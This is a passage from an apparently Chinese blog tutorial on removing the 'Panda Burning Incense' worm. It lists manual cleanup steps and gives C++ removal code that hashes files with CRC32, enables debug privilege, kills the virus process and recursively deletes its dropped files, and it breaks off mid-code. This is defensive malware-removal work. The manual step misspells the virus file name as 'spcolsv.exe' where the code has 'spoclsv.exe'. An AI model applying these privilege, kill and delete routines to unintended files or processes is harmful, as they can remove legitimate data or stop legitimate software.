<h2 id="3-2-手工查杀步骤"><a href="#3-2-手工查杀步骤" class="headerlink" title="3.2 手工查杀步骤"></a>3.2 手工查杀步骤</h2><p>1、删除【C:\Windows\System32\drivers\spcolsv.exe】文件<br>2、删除【HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVer<br>sion\Run】键项的svcshare<br>3、删除每个盘符根目录下生成两个文件【autorun.inf和setup.exe】文件<br>4、设置【HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer<br>\Advanced\Folder\Hidden\SHOWALL】，CheckedValue的键值设置为1（显示隐藏文件）</p>
<h2 id="3-3工具查杀步骤或是查杀思路"><a href="#3-3工具查杀步骤或是查杀思路" class="headerlink" title="3.3工具查杀步骤或是查杀思路"></a>3.3工具查杀步骤或是查杀思路</h2><p>代码编写主要参考姜烨博客关于熊猫烧香查杀的编写。<br>在查杀病毒的技术中有一种方法类似于特征码查杀法，这种方法并不从病毒内提取特征码，而是计算病毒的散列值。利用这个散列值，就可以在查杀的过程中计算每个文件的散列，然后进行比较。这种方法简单易于实现，一般在病毒刚被发现时，在逆向分析前使用。常见的计算散列的算法有MD5、Sha-1以及CRC32等。<br>计算CRC32的算法如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">CRC32</span><span class="params">(BYTE* ptr,DWORD Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    DWORD crcTable[<span class="number">256</span>],crcTmp1;   </span><br><span class="line">    <span class="comment">//动态生成CRC-32表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        crcTmp1 = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">8</span>; j&gt;<span class="number">0</span>; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (crcTmp1&amp;<span class="number">1</span>) crcTmp1 = (crcTmp1 &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>L;</span><br><span class="line">            <span class="keyword">else</span> crcTmp1 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        crcTable[i] = crcTmp1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//计算CRC32值</span></span><br><span class="line">    DWORD crcTmp2= <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    <span class="keyword">while</span>(Size--)</span><br><span class="line">    &#123;</span><br><span class="line">        crcTmp2 = ((crcTmp2&gt;&gt;<span class="number">8</span>) &amp; <span class="number">0x00FFFFFF</span>) ^ crcTable[ (crcTmp2^(*ptr)) &amp; <span class="number">0xFF</span> ];</span><br><span class="line">        ptr++;</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="keyword">return</span> (crcTmp2^<span class="number">0xFFFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数的参数有两个，一个是指向缓冲区的指针，第二个是缓冲区的长度。它将文件全部读入缓冲区中，然后用CRC32函数计算文件的CRC32散列值，可以得到我所研究的“熊猫烧香”病毒的散列值，不同版本的病毒的散列值是不同的。<br>我们需要在内存中查找病毒是否存在，代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">FindTargetProcess</span><span class="params">(<span class="keyword">char</span> *pszProcessName,DWORD *dwPid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bFind = FALSE;</span><br><span class="line">    </span><br><span class="line">    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> bFind;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    PROCESSENTRY32 pe = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(pe);</span><br><span class="line">    </span><br><span class="line">    BOOL bRet = Process32First(hProcessSnap,&amp;pe);</span><br><span class="line">    <span class="keyword">while</span> (bRet)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (lstrcmp(pe.szExeFile,pszProcessName) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            *dwPid = pe.th32ProcessID;</span><br><span class="line">            bFind = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bRet = Process32Next(hProcessSnap,&amp;pe);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    CloseHandle(hProcessSnap);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> bFind;</span><br><span class="line">&#125;</span><br><span class="line">	还需要提升系统的权限，提升成功后，当前进程就可以访问一些受限的系统资源。代码如下：</span><br><span class="line"><span class="function">BOOL <span class="title">EnableDebugPrivilege</span><span class="params">(<span class="keyword">char</span> *pszPrivilege)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hToken = INVALID_HANDLE_VALUE;</span><br><span class="line">    LUID luid;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line"> </span><br><span class="line">    BOOL bRet = OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&amp;hToken);</span><br><span class="line">    <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> bRet;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    bRet = LookupPrivilegeValue(<span class="literal">NULL</span>,pszPrivilege,&amp;luid);</span><br><span class="line">    <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> bRet;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"> </span><br><span class="line">    bRet = AdjustTokenPrivileges(hToken,FALSE,&amp;tp,<span class="keyword">sizeof</span>(tp),<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>病毒会在所有盘符下面的非系统目录中创建名为Desktop_.ini的文件，应当将其删除。<br>历整个磁盘的文件，这需要使用FindFirstFile()与FindNextFile()这两个API函数，并采用递归调用的方法；另一个是修改文件属性，因为病毒创建出来的文件会带有系统、只读和隐藏这三个属性，若不对其进行更改，是无法删除病毒文件的。依照这个思想，编写代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">FindFiles</span><span class="params">(LPVOID lpszPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        WIN32_FIND_DATA stFindFile;</span><br><span class="line">        HANDLE hFindFile;</span><br><span class="line">	<span class="comment">// 扫描路径</span></span><br><span class="line">	<span class="keyword">char</span> szPath[MAX_PATH];    </span><br><span class="line">	<span class="keyword">char</span> szFindFile[MAX_PATH];</span><br><span class="line">	<span class="keyword">char</span> szSearch[MAX_PATH];</span><br><span class="line">	<span class="keyword">char</span> *szFilter;</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">	szFilter = <span class="string">"*.*"</span>;</span><br><span class="line">	lstrcpy(szPath, (<span class="keyword">char</span> *)lpszPath);</span><br><span class="line"> </span><br><span class="line">	len = lstrlen(szPath);</span><br><span class="line">	<span class="keyword">if</span>(szPath[len<span class="number">-1</span>] != <span class="string">'\\'</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		szPath[len] = <span class="string">'\\'</span>;</span><br><span class="line">		szPath[len+<span class="number">1</span>] = <span class="string">'\0'</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	lstrcpy(szSearch, szPath);</span><br><span class="line">	lstrcat(szSearch,szFilter);</span><br><span class="line"> </span><br><span class="line">	hFindFile = FindFirstFile(szSearch, &amp;stFindFile);</span><br><span class="line">	<span class="keyword">if</span>(hFindFile != INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">		    lstrcpy(szFindFile, szPath);</span><br><span class="line">                    lstrcat(szFindFile, stFindFile.cFileName);</span><br><span class="line"> </span><br><span class="line">			<span class="keyword">if</span>(stFindFile.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY)</span><br><span class="line">			&#123;</span><br><span class="line">			    <span class="keyword">if</span>(stFindFile.cFileName[<span class="number">0</span>] != <span class="string">'.'</span>)</span><br><span class="line">				&#123;</span><br><span class="line">				    FindFiles(szFindFile);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span>(!lstrcmp(stFindFile.cFileName,<span class="string">"Desktop_.ini"</span>))</span><br><span class="line">				&#123;</span><br><span class="line">                                    <span class="comment">// 去除文件的隐藏、系统以及只读属性</span></span><br><span class="line">                                    DWORD dwFileAttributes = GetFileAttributes(szFindFile);</span><br><span class="line">                                    dwFileAttributes &amp;= ~FILE_ATTRIBUTE_HIDDEN;</span><br><span class="line">                                    dwFileAttributes &amp;= ~FILE_ATTRIBUTE_SYSTEM;</span><br><span class="line">                                    dwFileAttributes &amp;= ~FILE_ATTRIBUTE_READONLY;</span><br><span class="line">                                    SetFileAttributes(szFindFile, dwFileAttributes);</span><br><span class="line">                                    <span class="comment">// 删除Desktop_.ini</span></span><br><span class="line">                                    BOOL bRet = DeleteFile(szFindFile);	</span><br><span class="line">                                    csTxt += szFindFile;</span><br><span class="line">                                    <span class="keyword">if</span> (bRet)</span><br><span class="line">                                    &#123;</span><br><span class="line">                                        csTxt += _T(<span class="string">"被删除！\r\n"</span>);</span><br><span class="line">                                    &#125; </span><br><span class="line">                                    <span class="keyword">else</span></span><br><span class="line">                                    &#123;</span><br><span class="line">                                        csTxt += _T(<span class="string">"无法删除\r\n"</span>);</span><br><span class="line">                                    &#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			ret = FindNextFile(hFindFile, &amp;stFindFile);</span><br><span class="line">		&#125;<span class="keyword">while</span>(ret != <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	FindClose(hFindFile);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主程序代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">void</span> CKillWhBoyDlg::OnBtnKill() </span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> Add your control notification handler code here</span></span><br><span class="line">    BOOL bRet = FALSE;</span><br><span class="line">    DWORD dwPid = <span class="number">0</span>; </span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//  结束spoclsv.exe进程，并删除病毒程序本身</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line">    bRet = FindTargetProcess(<span class="string">"spoclsv.exe"</span>, &amp;dwPid);</span><br><span class="line">    <span class="keyword">if</span> (bRet == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        csTxt = _T(<span class="string">"检查系统内存...\r\n"</span>);</span><br><span class="line">        csTxt += _T(<span class="string">"系统中存在病毒进程:spoclsv.exe\r\n"</span>);</span><br><span class="line">        csTxt += _T(<span class="string">"准备进行查杀...\r\n"</span>);</span><br><span class="line">        SetDlgItemText(IDC_LIST,csTxt);   </span><br><span class="line">        <span class="comment">// 提升权限</span></span><br><span class="line">        bRet = EnableDebugPrivilege(SE_DEBUG_NAME);</span><br><span class="line">        <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"提升权限失败\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"提升权限成功！\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        SetDlgItemText(IDC_LIST,csTxt);</span><br><span class="line">        <span class="comment">// 打开并尝试结束病毒进程</span></span><br><span class="line">        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwPid);</span><br><span class="line">        <span class="keyword">if</span> (hProcess == INVALID_HANDLE_VALUE)</span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"无法结束病毒进程\r\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        bRet = TerminateProcess(hProcess,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (bRet == FALSE)</span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"无法结束病毒进程\r\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        csTxt += _T(<span class="string">"病毒进程已经结束\r\n"</span>);</span><br><span class="line">        SetDlgItemText(IDC_LIST,csTxt);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        csTxt += _T(<span class="string">"系统中不存在spoclsv.exe病毒进程\r\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    Sleep(<span class="number">10</span>);</span><br><span class="line">    <span class="comment">// 查杀磁盘中是否存在名为spoclsv.exe的病毒文件</span></span><br><span class="line">    <span class="keyword">char</span> szSysPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    GetSystemDirectory(szSysPath,MAX_PATH);</span><br><span class="line">    </span><br><span class="line">    lstrcat(szSysPath,<span class="string">"\\drivers\\spoclsv.exe"</span>);</span><br><span class="line"> </span><br><span class="line">    csTxt += _T(<span class="string">"检查硬盘中是否存在spoclsv.exe文件...\r\n"</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (GetFileAttributes(szSysPath) == <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        csTxt += _T(<span class="string">"spoclsv.exe病毒文件不存在\r\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        csTxt += _T(<span class="string">"spoclsv.exe病毒文件存在，正在计算散列值\r\n"</span>);</span><br><span class="line"> </span><br><span class="line">        HANDLE hFile = CreateFile(szSysPath,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">        &#123;</span><br><span class="line">            AfxMessageBox(<span class="string">"Create Error"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        DWORD dwSize = GetFileSize(hFile,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (dwSize == <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            AfxMessageBox(<span class="string">"GetFileSize Error"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        BYTE *pFile = (BYTE*)<span class="built_in">malloc</span>(dwSize);</span><br><span class="line">        <span class="keyword">if</span> (pFile == <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            AfxMessageBox(<span class="string">"malloc Error"</span>);</span><br><span class="line">            <span class="keyword">return</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        DWORD dwNum = <span class="number">0</span>;</span><br><span class="line">        ReadFile(hFile,pFile,dwSize,&amp;dwNum,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// 计算spoclsv.exe的散列值</span></span><br><span class="line">        DWORD dwCrc32 = CRC32(pFile,dwSize);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (pFile != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(pFile);</span><br><span class="line">            pFile = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        CloseHandle(hFile);</span><br><span class="line">        <span class="comment">// 0x89240FCD是“熊猫烧香”病毒的散列值</span></span><br><span class="line">        <span class="keyword">if</span> (dwCrc32 != <span class="number">0x89240FCD</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"spoclsv.exe校验和验证失败\r\n"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            csTxt += _T(<span class="string">"spoclsv.exe校验和验证成功，正在删除...\r\n"</span>);</span><br><span class="line">            <span class="comment">// 去除文件的隐藏、系统以及只读属性</span></span><br><span class="line">            DWORD dwFileAttributes = GetFileAttributes(szSysPath);</span><br><span class="line">            dwFileAttributes &amp;= ~FILE_ATTRIBUTE_HIDDEN;</span><br><span class="line">            dwFileAttributes &amp;= ~FILE_ATTRIBUTE_SYSTEM;</span><br><span class="line">            dwFileAttributes &amp;= ~FILE_ATTRIBUTE_READONLY;</span><br><span class="line">            SetFileAttributes(szSysPath, dwFileAttributes);</span><br><span class="line">            <span class="comment">// 删除spoclsv.exe</span></span><br><span class="line">            bRet = DeleteFile(szSysPath);</span><br><span class="line">            <span class="keyword">if</span> (bRet)</span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"spoclsv.exe病毒被删除！\r\n"</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                csTxt += _T(<span class="string">"spoclsv.exe病毒无法删除\r\n"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">    SetDlgItemText(IDC_LIST,csTxt);</span><br><span class="line">    Sleep(<span class="number">10</span>);</span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line"><span class="comment">//  删除每个盘符下的setup.exe与autorun.inf，以及Desktop_.ini</span></span><br><span class="line"><span class="comment">///////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="keyword">char</span> szDriverString[MAXBYTE] = &#123; <span class="number">0</span> &#125;;  </span><br><span class="line">    <span class="keyword">char</span> *pTmp = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="comment">//获取字符串类型的驱动器列表  </span></span><br><span class="line">    GetLogicalDriveStrings(MAXBYTE, szDriverString);  </span><br><span class="line">  </span><br><span class="line">    pTmp = szDriverString;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span>( *pTmp )  </span><br><span class="line">    